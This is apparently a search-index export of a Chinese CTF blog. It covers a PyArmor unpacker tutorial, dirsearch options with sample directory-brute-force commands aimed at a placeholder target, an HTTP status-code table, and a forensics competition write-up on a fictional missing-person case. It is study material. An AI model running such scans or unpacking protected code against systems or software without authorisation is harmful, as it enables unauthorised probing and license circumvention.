text](/img/SPC新生赛即美亚杯选拔赛_image-41.png)\n","tags":["wp","ctf"],"categories":["wp"]},{"title":"PyArmor-Unpacker使用教程","url":"/2025/10/21/PyArmor-Unpacker使用教程/","content":"# Readme.md文件翻译\n\n[Pyarmor](https://github.com/dashingsoft/pyarmor) 是一款流行的 Python 源代码保护工具。它将 Python 脚本转换为二进制数据，这些数据可以看作是 pyc 文件的加密变体。它们可以通过一个共享库（pyarmor_runtime）解密，然后由 Python 解释器执行。\n\n本项目旨在将受保护的（armored）数据转换回字节码汇编，并（实验性地）转换回源代码。我们复刻了优秀的 [Decompyle++](https://github.com/zrax/pycdc)（又名 pycdc），并在其基础上添加了一些处理流程，例如修改抽象语法树。\n\n> [!IMPORTANT]\n>\n> 此工具仅应用于您拥有或已获授权分析的脚本。请尊重软件许可证和服务条款。作者不对因使用此工具造成的任何误用或损害负责。\n\n> [!NOTE]\n>\n> 与其他反编译器一样，此工具面向专业用户。您应对 Python 字节码有基本的了解。如果不是，您可能需要向了解的人寻求帮助。\n\n> [!WARNING]\n>\n> **反汇编结果是准确的，但反编译的代码可能不完整或不正确。** [参见 issue #3](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/issues/3)\n\n## 特性\n\n### 静态分析\n\n您无需执行加密的脚本。我们使用与 pyarmor_runtime 相同的算法来解密它们。这在脚本不可信时非常有用。\n\n### 通用性强\n\n目前我们正尝试支持 Pyarmor 8.0 到 9.1.x（最新版），Python 3.7 到 3.13，在所有操作系统上，并尽可能支持多种混淆选项。（然而，我们的测试有限。）\n\n> [!NOTE]\n>\n> 如果数据以 `PY` 开头，后跟六位数字，则受支持。否则，如果它以 `PYARMOR` 开头，则是由 Pyarmor 7 或更早版本生成的，不受支持。\n\n### 易于使用\n\n您唯一需要做的是指定您混淆脚本的位置。该工具将完成所有工作，如检测受保护数据、解析、反汇编和反编译。请参阅下面的\"使用方法\"部分。\n\n## 构建\n\n```bash\nmkdir build\ncd build\ncmake ../pycdc\ncmake --build .\ncmake --install .\n```\n您也可以在[发布页面](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases)下载预编译的二进制文件。\n### 使用方法\n```bash\npython /path/to/oneshot/shot.py /path/to/scripts\n```\n在运行 shot.py 之前，请确保 oneshot 目录中存在可执行文件 pyarmor-1shot（在 Windows 上是 pyarmor-1shot.exe）。\n\n您只需要指定包含所有受保护数据和 pyarmor_runtime 的目录。该工具会尽可能地递归查找和处理它们。\n\n必要时，可以使用 -r path/to/pyarmor_runtime[.pyd|.so|.dylib] 来指定一个 pyarmor_runtime 可执行文件。\n\n所有由此工具生成的文件在其文件名中都包含 .1shot.。如果您想将它们保存到另一个目录而不是原地保存，请使用 -o another/path/。文件夹结构将保持不变。\n\n注意：\n\n- 如果文件夹名称恰好是 __pycache__ 或 site-packages，或者它直接包含一个名为 .no1shot 的文件，则其子目录将不会被处理，并且符号链接不会被跟踪，以避免重复或无限循环并节省时间。如果您确实需要处理它们，请稍后在这些目录中运行脚本并指定运行时。\n\n- 由 PyInstaller 等生成的归档文件、可执行文件等，必须在使用其他工具解包后再进行解密，否则您可能会遇到未定义的行为。\n\n### 反馈\n如果您有任何疑问、建议或问题，请随时提出 issue。如果可能，请不要忘记附上受保护的数据和 pyarmor_runtime 可执行文件。\n\n### 待办事项（欢迎提交 PR！）\n多平台 pyarmor_runtime 可执行文件支持\n\n支持更多混淆选项\n\n为其他后端重新生成 pyc\n\n文档（不接受关于此部分的 PR）\n\n### 致 CTF 挑战赛出题人\n请不要制作那些关于寻找和使用现有工具的 CTF（夺旗赛）逆向挑战。这对任何人都没有乐趣。这更像是一场捉迷藏游戏，而不是对技能和创造力的考验。\n\n理解 Pyarmor 或此工具的工作原理，并尝试改进它们，会更有意义。\n\nStar 趋势图\n<https://starchart.cc/Lil-House/Pyarmor-Static-Unpack-1shot.svg?variant=adaptive>\n\n# 具体使用方法\n- payload\n```python\npython E:\\app-down\\ctf工具箱\\ctf工具箱\\pyarmor-1shot-v0.2.1-windows-x86_64\\oneshot\\shot.py (待解密文件位置)\n```\n- 解密后的文件应该会生成在相同目录下，文件名会包含 .1shot. 标识，例如：\n  - start.1shot.dis.py (反汇编结果)\n  - start.1shot.py (反编译的源代码)"},{"title":"dirsearch使用方法","url":"/2025/10/21/dirsearch使用方法/","content":"### 选项:\n\n--version 显示程序的版本号并退出\n\n-h, --help 显示此帮助消息并退出\n\n必需：\n\n-u URL, --url=URL 目标URL，可以使用多个选项指定多个目标URL\n\n-l PATH, --urls-file=PATH\n\nURL列表文件\n\n--stdin 从标准输入读取URL\n\n--cidr=CIDR 目标CIDR\n\n--raw=PATH 从文件加载原始HTTP请求（使用'--scheme'标志设置方案）\n\n-s SESSION_FILE, --session=SESSION_FILE\n\n会话文件\n\n--config=PATH 配置文件路径（默认为'DIRSEARCH_CONFIG'环境变量，否则为'config.ini'）\n\n字典设置:\n\n-w WORDLISTS, --wordlists=WORDLISTS\n\n单词列表文件或包含单词列表文件的目录（以逗号分隔）\n\n-e EXTENSIONS, --extensions=EXTENSIONS\n\n扩展名列表，以逗号分隔（例如：php,asp）\n\n-f, --force-extensions\n\n在每个单词列表条目的末尾添加扩展名。默认情况下，dirsearch只替换%EXT%关键字为扩展名。\n\n-O, --overwrite-extensions\n\n使用指定的扩展名覆盖单词列表中的其他扩展名（通过'-e'选择）\n\n--exclude-extensions=EXTENSIONS\n\n排除的扩展名列表，以逗号分隔（例如：asp,jsp）\n\n--remove-extensions 删除所有路径中的扩展名（例如：admin.php -> admin）\n\n--prefixes=PREFIXES 将自定义前缀添加到所有单词列表条目中（以逗号分隔）\n\n--suffixes=SUFFIXES 将自定义后缀添加到所有单词列表条目中，忽略目录（以逗号分隔）\n\n-U, --uppercase 单词列表转为大写\n\n-L, --lowercase 单词列表转为小写\n\n-C, --capital 单词首字母大写\n\n通用设置:\n\n-t THREADS, --threads=THREADS\n\n线程数\n\n-r, --recursive 递归地进行强制破解\n\n--deep-recursive 在每个目录深度上执行递归扫描（例如：api/users -> api/）\n\n--force-recursive 对找到的每个路径执行递归强制破解，而不仅仅是目录\n\n-R DEPTH, --max-recursion-depth=DEPTH\n\n最大递归深度\n\n--recursion-status=CODES\n\n用于执行递归扫描的有效状态码，支持范围（以逗号分隔）\n\n--subdirs=SUBDIRS 扫描给定URL的子目录（以逗号分隔）\n\n--exclude-subdirs=SUBDIRS\n\n在递归扫描期间排除以下子目录（以逗号分隔）\n\n-i CODES, --include-status=CODES\n\n包括的状态码，以逗号分隔，支持范围（例如：200,300-399）\n\n-x CODES, --exclude-status=CODES\n\n排除的状态码，以逗号分隔，支持范围（例如：301,500-599）\n\n--exclude-sizes=SIZES\n\n根据大小排除响应，以逗号分隔（例如：0B,4KB）\n\n--exclude-text=TEXTS 根据文本排除响应，可以使用多个标志\n\n--exclude-regex=REGEX\n\n根据正则表达式排除响应\n\n--exclude-redirect=STRING\n\n如果此正则表达式（或文本）与重定向URL匹配，则排除响应（例如：'/index.html'）\n\n--exclude-response=PATH\n\n排除类似于此页面响应的响应，路径作为输入（例如：404.html）\n\n--skip-on-status=CODES\n\n每当命中这些状态码之一时跳过目标，以逗号分隔，支持范围\n\n--min-response-size=LENGTH\n\n响应的最小长度\n\n--max-response-size=LENGTH\n\n响应的最大长度\n\n--max-time=SECONDS 扫描的最大运行时间\n\n--exit-on-error 发生错误时退出\n\n请求设置:\n\n-m METHOD, --http-method=METHOD\n\nHTTP请求方法（默认为GET）\n\n-d DATA, --data=DATA HTTP请求数据\n\n--data-file=PATH 包含HTTP请求数据的文件\n\n-H HEADERS, --header=HEADERS\n\nHTTP请求标头，可以使用多个标志\n\n--headers-file=PATH 包含HTTP请求标头的文件\n\n-F, --follow-redirects\n\n跟随HTTP重定向\n\n--random-agent 每个请求选择一个随机User-Agent\n\n--auth=CREDENTIAL 认证凭据（例如：user:password或bearer token）\n\n--auth-type=TYPE 认证类型（basic、digest、bearer、ntlm、jwt）\n\n--cert-file=PATH 包含客户端证书的文件\n\n--key-file=PATH 包含客户端证书私钥的文件（未加密）\n\n--user-agent=USER_AGENT\n\n--cookie=COOKIE\n\n连接设置:\n\n--timeout=TIMEOUT 连接超时时间\n\n--delay=DELAY 请求之间的延迟\n\n-p PROXY, --proxy=PROXY\n\n代理URL（HTTP/SOCKS），可以使用多个标志\n\n--proxies-file=PATH 包含代理服务器的文件\n\n--proxy-auth=CREDENTIAL\n\n代理认证凭据\n\n--replay-proxy=PROXY 用于重放已发现路径的代理\n\n--tor 使用Tor网络作为代理\n\n--scheme=SCHEME 原始请求的协议或URL中没有协议时使用的协议（默认为自动检测）\n\n--max-rate=RATE 每秒请求数最大值\n\n--retries=RETRIES 失败请求的重试次数\n\n--ip=IP 服务器IP地址\n\n高级设置:\n\n--crawl 在响应中爬取新路径\n\n显示设置:\n\n--full-url 在输出中显示完整URL（在静默模式下自动启用）\n\n--redirects-history 显示重定向历史记录\n\n--no-color 不使用彩色输出\n\n-q, --quiet-mode 安静模式\n\n输出设置:\n\n-o PATH/URL, --output=PATH/URL\n\n输出文件或MySQL/PostgreSQL数据库URL（格式：\n\nscheme://[username:password@]host[:port]/database-\n\nname）\n\n--format=FORMAT 报告格式（可用：simple、plain、json、xml、md、csv、html、\n\nsqlite、mysql、postgresql）\n\n--log=PATH 日志文件\n\n### payload\n```cmd\npython3 dirsearch.py -e php,txt,zip -u https://target     //简单的查看网址目录和文件\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //使用文件拓展名为php,txt,zip的字典扫描目标url\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H \"User-Agent: IE\"\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -t 20\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --random-agents\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --json-report=reports/target.json\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --simple-report=reports/target-paths.txt\n\npython3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --plain-text-report=reports/target-paths-and-status.js\n```"},{"title":"http状态码","url":"/2025/10/21/http状态码/","content":"| 状态码 | 英文名称                  | 中文描述                                                                 |\n|--------|---------------------------|--------------------------------------------------------------------------|\n| 100    | Continue                  | 继续。客户端应继续其请求                                                 |\n| 101    | Switching Protocols       | 切换协议。服务器根据客户端的请求切换协议，只能切换到更高级的协议         |\n| 200    | OK                        | 请求成功。一般用于 GET 与 POST 请求                                      |\n| 201    | Created                   | 已创建。成功请求并创建了新的资源                                         |\n| 202    | Accepted                  | 已接受。已经接受请求，但未处理完成                                       |\n| 203    | Non-Authoritative Info    | 非授权信息。请求成功，但返回的 meta 信息不在原始服务器，而是一个副本     |\n| 204    | No Content                | 无内容。服务器成功处理，但未返回内容                                     |\n| 205    | Reset Content             | 重置内容。服务器处理成功，用户终端应重置文档视图                         |\n| 206    | Partial Content           | 部分内容。服务器成功处理了部分 GET 请求                                  |\n| 300    | Multiple Choices          | 多种选择。请求的资源可包括多个位置                                       |\n| 301    | Moved Permanently         | 永久移动。请求的资源已被永久移动到新 URI                                 |\n| 302    | Found                     | 临时移动。资源只是临时被移动，客户端应继续使用原有 URI                   |\n| 303    | See Other                 | 查看其它地址。使用 GET 和 POST 请求查看                                  |\n| 304    | Not Modified              | 未修改。所请求的资源未修改，服务器不会返回任何资源                       |\n| 305    | Use Proxy                 | 使用代理。所请求的资源必须通过代理访问                                   |\n| 306    | Unused                    | 已经被废弃的 HTTP 状态码                                                 |\n| 307    | Temporary Redirect        | 临时重定向。与 302 类似，使用 GET 请求重定向                             |\n| 400    | Bad Request               | 客户端请求的语法错误，服务器无法理解                                     |\n| 401    | Unauthorized              | 请求要求用户的身份认证                                                   |\n| 402    | Payment Required          | 保留，将来使用                                                           |\n| 403    | Forbidden                 | 服务器理解请求，但拒绝执行                                               |\n| 404    | Not Found                 | 服务器无法根据请求找到资源                                               |\n| 405    | Method Not Allowed        | 客户端请求中的方法被禁止                                                 |\n| 406    | Not Acceptable            | 服务器无法根据客户端请求的内容特性完成请求                               |\n| 407    | Proxy Auth Required       | 请求要求代理的身份认证                                                   |\n| 408    | Request Timeout           | 服务器等待客户端发送的请求时间过长，超时                                 |\n| 409    | Conflict                  | 服务器处理请求时发生了冲突                                               |\n| 410    | Gone                      | 客户端请求的资源已经不存在                                               |\n| 411    | Length Required           | 服务器无法处理不带 Content-Length 的请求信息                             |\n| 412    | Precondition Failed       | 客户端请求信息的先决条件错误                                             |\n| 413    | Request Entity Too Large  | 请求的实体过大，服务器无法处理                                           |\n| 414    | Request-URI Too Large     | 请求的 URI 过长，服务器无法处理                                          |\n| 415    | Unsupported Media Type    | 服务器无法处理请求附带的媒体格式                                         |\n| 416    | Requested Range Not Satisfiable | 客户端请求的范围无效                                               |\n| 417    | Expectation Failed        | 服务器无法满足请求头中 Expect 字段指定的预期行为                         |\n| 418    | I'm a teapot              | 状态码 418 是一个愚人节玩笑，定义于 RFC 2324                             |\n| 500    | Internal Server Error     | 服务器内部错误，无法完成请求                                             |\n| 501    | Not Implemented           | 服务器不支持请求的功能，无法完成请求                                     |\n| 502    | Bad Gateway               | 作为网关或代理的服务器从远程服务器接收到无效响应                         |\n| 503    | Service Unavailable       | 服务器暂时无法处理请求，可能因超载或系统维护                             |\n| 504    | Gateway Timeout           | 充当网关或代理的服务器未及时从远端服务器获取请求                         |\n| 505    | HTTP Version Not Supported| 服务器不支持请求的 HTTP 协议版本                                         |","tags":["ctf","web"],"categories":["知识点笔记"]},{"title":"2024美亚杯个人资格赛wp","url":"/2025/10/20/2024美亚杯个人资格赛wp/","content":"## 致谢\n- 感谢dh，sq，zxx学长，ctj学姐的大力帮助\n- 累死了ㅍ_ㅍ感觉一直在干\n\n### 题目：\n![alt text](/img/2024美亚杯个人资格赛wp_image.png)\n\n### 1. [单选题] Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma_Mobile.zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？(2分)\n**A. 22.451721666667, 114.171853333333**\nB. 22.451553333333, 114.172845\nC. 22.451928333333, 114.170503333333\nD. 22.451638333333, 114.16993\n- 图片信息之经纬度\n  - exiftool：图片拖到exe文件上打开，此题信息没藏里面\n```\nExifTool Version Number         : 13.39\nFile Name                       : 314.pic\n...\nFile Modification Date/Time     : 2024:08:30 18:03:30+08:00\nFile Access Date/Time           : 2025:11:02 21:14:37+08:00\nFile Creation Date/Time         : 2025:11:02 21:14:37+08:00\n...\n```\n![alt text](/img/2024美亚杯个人资格赛wp_image-2.png)\n  - 后面纯翻数据库。。根据File Modification Date/Time。。好难\n  - 微信的数据中编号最大的文件 314.pic. 这个编号对应的是微信的消息数据库里的编号.\n  - 也对应图片的MesLocalID\n  - 在来自微信的数据库 **message_2.sqlite** 中可以找到这条消息的 xml 原始数据通过编号314\n```\n<msg><img hdlength=\"0\" length=\"139561\" aeskey=\"b3f5f12230235d3dfe4f90e4984c8ebf\" encryver=\"1\" md5=\"44c089af8c9a1414edb8ee6026be3307\" originsourcemd5=\"0bbe83bda8f3e13735e9009078a231f0\" filekey=\"wxid_t7zgo57j9m0j22_314_1725012210\" uploadcontinuecount=\"0\" imgsourceurl=\"\" hevc_mid_size=\"139561\" cdnbigimgurl=\"\" cdnmidimgurl=\"3052020100044b30490201000204a695112702030f525902044b7d9b2b020466d198f2042432353830663531302d623137372d343463312d623732642d6566396562313331663331610204011d0a020201000400\" cdnthumburl=\"3052020100044b30490201000204a695112702030f525902044b7d9b2b020466d198f2042432353830663531302d623137372d343463312d623732642d6566396562313331663331610204011d0a020201000400\" cdnthumblength=\"3971\" cdnthumbwidth=\"90\" cdnthumbheight=\"120\" cdnthumbaeskey=\"b3f5f12230235d3dfe4f90e4984c8ebf\"/><appinfo><appid></appid><appname></appname><version>0</version><isforceupdate>1</isforceupdate><mediatagname></mediatagname><messageext></messageext><messageaction></messageaction></appinfo><MMAsset><m_assetUrlForSystem><![CDATA[F58B98FE-8010-44B7-8BF7-F23AF15DCFCA/L0/001]]></m_assetUrlForSystem><m_isNeedOriginImage>0</m_isNeedOriginImage><m_isFailedFromIcloud>0</m_isFailedFromIcloud><m_isLoadingFromIcloud>0</m_isLoadingFromIcloud></MMAsset></msg>\n```\n  - 其中可以看到 <m_assetUrlForSystem>\\<![CDATA[F58B98FE-8010-44B7-8BF7-F23AF15DCFCA/L0/001]]></m_assetUrlForSystem> 意为来自系统的附件路径, 附件的 GUID 为 F58B98FE-8010-44B7-8BF7-F23AF15DCFCA.\n  - 在 iOS 系统的相册数据库 photos.db (固定Photo.splite也可以)中可以找到对应的 GUID:\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-4.png)\n- 总结：\n  - 微信记录→message\n    - DES发送人\n    - MesLocalID对应图片名字XXX.pic\n  - UUID 和 GUID 指的是同一种东西\n    - UUID 是学术和开放标准的叫法；GUID 是微软对这一标准的实现和推广时使用的名称\n  - navicat打开splite\n\n### 2. [单选题] 根据Emma_Mobile.zip，2024年8月30日下午两点后Emma共致电Clara多少次？(1分)\nA. 85\nB. 86\nC. 87\nD. 88\n![alt text](/img/2024美亚杯个人资格赛wp_image-3.png)\n```SQL\nSELECT *\n    FROM ZCALLRECORD\n    WHERE ZADDRESS=63791704 AND ZDATE >= 746690400;\n```\n- **88**\n- CST+14=+8:00\n\n- 找电话号码：iOS的通讯录存储在addressbook.sqlitedb.db里，具体是在里边的ABPersonFullTextSearch_content里，找电话：63791704\n- **iOS通话记录存在CallHiStory.storedata.db**里，打开直接搜索招表，再筛选电话\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-5.png)\n- `2024-08-30 14:00:00`→`1724997600`【随波逐流】你别管高贵的苹果有自己的时间戳，但屈尊用的我们+8时区哈哈哈\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-6.png)\n\n### 3. [单选题] 根据Emma和Clara的微信聊天记录，Clara失踪前曾告诉Emma会到哪里？(1分)\n**A. 到酒店和丈夫David庆祝结婚周年**\nB. 吃自助餐\nC. 约了朋友见面\nD. 去旅行\n\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-7.png)\n\n### 4. [填空题] 参考Emma_Mobile.zip，Emma的iPhone XR内微信应用程序的版本是多少？(2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-1.png)\n- **8.0.50**\n- plist查看器微信搜tencent\n### 5. [多选题] 参考Emma_Mobile.zip，Emma手机中下列哪个选项是正确的？(2分)\nA. iOS版本为17.6.1\n**B. IMEI为356414106484705**\nC. Apple ID为Emma1761@gmail.com\n**D. 手机曾经安装Metamask应用程式**\n![alt text](/img/2024美亚杯个人资格赛wp_image-8.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-12.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-9.png)\n- 找错了\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-11.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-10.png)\n\n### 6. [填空题] 参考Emma_Mobile.zip,Emma手机中Apple ID的注册电子邮箱是多少？(2分)\n- **emmaemma.851231@gmail.com**\n### 7. [填空题] 参考Emma_Mobile.zip，在2024年，Emma手机上曾记录的电话卡集成电路卡标识符(ICCID)是多少？(答案格式:只需使用阿拉伯数字回答)(2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-13.png)\n- **8985200000826445829**\n### 8. [填空题] 参考Emma_Mobile.zip，Emma手机的蓝牙设备名称\"ELK-BLEDOM\"的通用唯一标识符(UUID)是什么？(1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-14.png)\n- **8D13F23C-E73C-6A98-AA4F-16C8D7A5F826**\n### 9. [单选题] 你发现了一些线索，Emma看起来也很可疑，她似乎背负了大量债务。参考Emma_Mobile.zip，Emma手机内Safari浏览记录中网页\"https://racing.hkjc.com/\"的网站标题是什么？(1分)\nA. 香港马会奖券有限公司\nB. 六合彩 - Google 搜索\nC. 快易钱:网上贷款财务公司 | 足不出户现金即日到手\n**D. 赛马信息 - 香港赛马会**\n![alt text](/img/2024美亚杯个人资格赛wp_image-15.png)\n\n### 10. [单选题] 参考Emma_Mobile.zip，Emma向Clara透露什么原因令Emma欠下巨债？(1分)\nA. 投资孖展\nB. 虚拟货币失利\nC. 网上赌博\n**D. 以上皆是**\n- message2里面4是c\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-16.png)\n- **D**\n### 11. [单选题] 参考Emma_Mobile.zip，收债人要求Emma还款数量？(1分)\nA. 港币\\$786,990\nB. 港币\\$878,990\n**C. 港币\\$786,980**\nD. 港币\\$745,330\n![alt text](/img/2024美亚杯个人资格赛wp_image-17.png)\n### 12. [单选题] 参考Emma_Mobile.zip，Emma发送了多少张.PNG图片给Clara，证明自己正被人追债？(2分)\nA. 6\n**B. 7**\nC. 8\nD. 9\n![alt text](/img/2024美亚杯个人资格赛wp_image-18.png)\n### 13. [单选题] 参考Emma_Mobile.zip，Emma用来浏览虚拟货币的网址？(2分)\nA. Google.com\nB. Facebook.com\n**C. IntellaX.io**\nD. Yahoo.com\n![alt text](/img/2024美亚杯个人资格赛wp_image-19.png)\n- 据说被怀疑是因为域名有钱包信息，疑惑（’へ’）\n### 14. [单选题] 参考Emma_Mobile.zip的浏览器记录，有多少网址与bet365有关? (2分)\n**A. 3**\nB. 13\nC. 9\nD. 12\n![alt text](/img/2024美亚杯个人资格赛wp_image-20.png)\n- title都是标题数据库，总共三条\n### 15. [单选题] 你还发现了一些与不当使用他人加密钱包相关的痕迹。参考Emma_Mobile.zip，Emma用了哪些恢复短语(Recovery Phrase)进入David的虚拟货币账户？(2分)\nA. stock,avocado,grab,clay\nB. light,sadness,segment,ancient\nC. toe,talk,elder,oil\n**D. 以上皆是**\n![alt text](/img/2024美亚杯个人资格赛wp_image-21.png)\n### 16. [单选题] 参考Emma_Mobile.zip，Emma从David处窃取的虚拟货币的名称是什么？(2分)\n**A. IDFC**\nB. ICAC\nC. INIC\nD. IFCC\n![alt text](/img/2024美亚杯个人资格赛wp_image-22.png)\n### 17. [单选题] 参考Emma_Mobile.zip，Clara偷拍的照片中，David的虚拟货币余额是多少？(2分)\nA. 3266378.99\nB. 1044749.22\n**C. 5022915.66**\nD. 7822468.44\n\n### 18. [单选题] 参考Emma_Mobile.zip，Emma在偷窃David的虚拟货币前，Emma曾向Clara透露有什么事发生在Emma身上？(1分)\nA. 中彩票\n**B. 欠债**\nC. 升职\nD. 失业\n![alt text](/img/2024美亚杯个人资格赛wp_image-23.png)\n### 19. [多选题] (你查看了Emma手机中的一些照片数字信息，以获取更多与失踪案件的信息)Emma的iPhone XR中\"IMG_0008.HEIC\"的图像与相片名字为的\"5005.JPG\" 看似为同一张相片，在数码法理鉴证分析下，以下哪样描述是正确？(3分)\nA. 储存在不同的.db檔案里\n**B. 有不同哈希值**\n**C. IMG_0008.HEIC为原图，\"5005.JPG\"为并非原图**\nD. IMG_0008.HEIC和名字\"5005.JPG\"是同一张相片\n![alt text](/img/2024美亚杯个人资格赛wp_image-24.png)\n> 转述川佬的博客原话\n> - HEIC是苹果拍照生成的图片格式，这个格式安卓手机在正常情况下是看不了的。当发送图片时，手机或者应用会将图片的格式进行转换，改成其他类型。所以，两种图片肯定不是一张图，所以有不同哈希值。\n\n### 20. [单选题] 参考Emma_Mobile.zip，Emma的iPhone XR中\"IMG_0009.HEIC\" 的图像显示拍摄参数怎样？(2分)\n**A. iPhone XR back camera 4.25mm f/1.8**\nB. iPhone XR back camera 4.25mm f/2.8\nC. iPhone XR back camera 4.25mm f/2\nD. iPhone XR back camera 4.25mm f/1.6\n![alt text](/img/2024美亚杯个人资格赛wp_image-25.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-27.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-28.png)\n- 搜了半天结果最后所有图片配置一样。。。\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-26.png)\n### 21. [多选题] 参考Emma_Mobile.zip，Emma的iPhone XR中相片文件IMG_0009.HEIC提供了什么电子证据信息？(3分)\nA. 此相片是由隔空投送 (Airdrop)得来\n**B. 此相片由iPhone XR拍摄**\n**C. 此相片的拍摄时间为2024-08-05 13:38:15(UTC+8)**\nD. 此相片的拍摄时间为2024-08-06 08:30:52(UTC+8)\n- AB互斥\n![alt text](/img/2024美亚杯个人资格赛wp_image-29.png)\n### 22. [多选题] 参考Emma_Mobile.zip，Emma的iPhone XR内以下哪张照片是实况照片(Live Photos)？(2分)\n**A. IMG_0002.HEIC**\nB. IMG_0005.HEIC\n**C. IMG_0004.HEIC**\nD. IMG_0006.HEIC\n- wp1：感觉首先得是HEIC格式，然后是display，都有的才是\n- wp2：\n  - iPhone 中的实况照片扩展名为 .HEIC, 用 SQL 语句筛选一下扩展名符合且 ZVIDEOCPDURATIONVALUE (视频片段长度) 字段不为 0 的照片:\n```SQL\nSELECT Z_PK, ZFILENAME \n    FROM ZASSET\n    WHERE ZFILENAME LIKE '%.HEIC' \n        AND ZUNIFORMTYPEIDENTIFIER = 'public.heic' \n        AND ZVIDEOCPDURATIONVALUE != 0;\n```\n![alt text](/img/2024美亚杯个人资格赛wp_image-30.png)\n  - 这题有点白给的, IMG_0005.HEIC 和 IMG_0006.HEIC 这两个文件根本不存在(实际扩展名为 PNG), 又是多选题, 排除一下也能选出来答案.\n### 23. [单选题] 参考Emma_Mobile.zip,手机里有多少张照片是用手机后置摄像镜头拍摄的? (2分)\nA. 5\nB. 6\nC. 7\nD. 8\n- 直接搜back（不行太多了肉眼筛选有难度）或者前面的摄像头信息iPhone XR back camera 4.25mm f/1.8\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-31.png)\n\n### 24. [单选题] 参考Emma_Mobile.zip的通讯记录，MesLocalID 224是什么类的文件？(3分)\n**A. 相片**\nB. 影片\nC. 文件\nD. 报表\n![alt text](/img/2024美亚杯个人资格赛wp_image-33.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-32.png)\n### 25. [单选题] 依据你在Emma的手机上找到的照片，你告诉调查员Clara最后的位置是在湾仔的一家酒店。根据你提供的信息，调查员发现Clara在酒店去世，Clara的手机在她的附近，你对Clara的手机进行取证。请根据取证结果回答以下问题｡ 参考Clara_Smartphone.bin，Clara手机的Android操作系统版本是？(1分)\n**A. 8.0.0**\nB. 9.0.0\nC. 8.1.0\nD. 7.0.0\n\n### 26. [填空题] 参考Clara_Smartphone.bin，Clara手机的版本号(Build Number)是什么？(1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-35.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-34.png)\n- **OPR1.170623.026**\n### 27. [填空题] 参考Clara_Smartphone.bin，Clara手机的IMEI号码是多少？(答案格式:只填写阿拉伯数字部分) (1分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-36.png)\n- 351537092934716\n### 28. [填空题] 参考Clara_Smartphone.bin，Emma的微信账号是？(2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-38.png)\n- **wxid_ltrpgdhvilso22**\n### 29. [单选题] 参考Clara_Smartphone.bin，Clara的第一封电子邮件记录的日期？(2分)\n**A. 2024-07-10**\nB. 2024-07-18\nC. 2024-07-23\nD. 2024-07-30\n![alt text](/img/2024美亚杯个人资格赛wp_image-39.png)\n### 30. [单选题] 参考Clara_Smartphone.bin，在通讯录中\"David\"的联系人信息还包括什么? (2分)\nA. 出生日期\nB. LinkedIn\nC. 电子邮件\nD. 地址\n- 火眼直接看另外三个没有\n- 源文件搜LinkedIn\n![alt text](/img/2024美亚杯个人资格赛wp_image-40.png)\n### 31. [单选题] 参考Clara_Smartphone.bin，David和Clara之间通话次数? (2分)\nA. 0\n**B. 8**\nC. 10\nD. 24\n![alt text](/img/2024美亚杯个人资格赛wp_image-41.png)\n### 32. [单选题] 参考Clara_Smartphone.bin，Clara在Chrome浏览器搜索中哪天使用了关键词\"popmart 炒价\"? (2分)\nA. 2024-08-10\n**B. 2024-08-15**\nC. 2024-08-20\nD. 2024-08-25\n- 注意火眼可能是繁体所以筛选时候去除中文\n### 33. [单选题] 参考Clara_Smartphone.bin，2024年7月30日共收到多少封电子邮件？(2分)\nA. 2\nB. 3\n**C. 4**\nD. 5\n![alt text](/img/2024美亚杯个人资格赛wp_image-42.png)\n### 34. [填空题] 参考Clara_Smartphone.bin，Clara的Gmail账号是? (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-43.png)\n### 35. [单选题] 参考Clara_Smartphone.bin，Clara的手机安装了哪个版本的WhatsApp？(2分)\nA. 241676000\nB. 241676001\n**C. 241676004**\nD. 241676007\n![alt text](/img/2024美亚杯个人资格赛wp_image-44.png)\n- jadx看apk\n![alt text](/img/2024美亚杯个人资格赛wp_image-45.png)\n### 36. [填空题] 参考Clara_Smartphone.bin，Clara的WhatsApp账号？(答案格式:只需填写11位阿拉伯数字) (2分)\n![alt text](/img/2024美亚杯个人资格赛wp_image-46.png)\n- **85263791704**\n### 37. [单选题] 参考Clara_Smartphone.bin，Clara的手机在什么时候安装了小红书APP？(2分)\nA. 2024-07-10\n**B. 2024-07-16**\nC. 2024-07-20\nD. 2024-07-30\n![alt 